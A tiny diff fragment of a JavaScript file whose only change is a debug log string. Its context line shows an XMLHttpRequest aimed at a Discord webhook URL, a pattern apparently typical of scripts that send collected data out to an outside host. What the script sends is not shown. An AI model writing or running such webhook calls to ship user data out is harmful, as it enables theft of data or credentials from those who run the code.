@@ -40,5 +40,5 @@ var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/12300
     });
 })();
 
-console.log('j')
+console.log('f1')
 
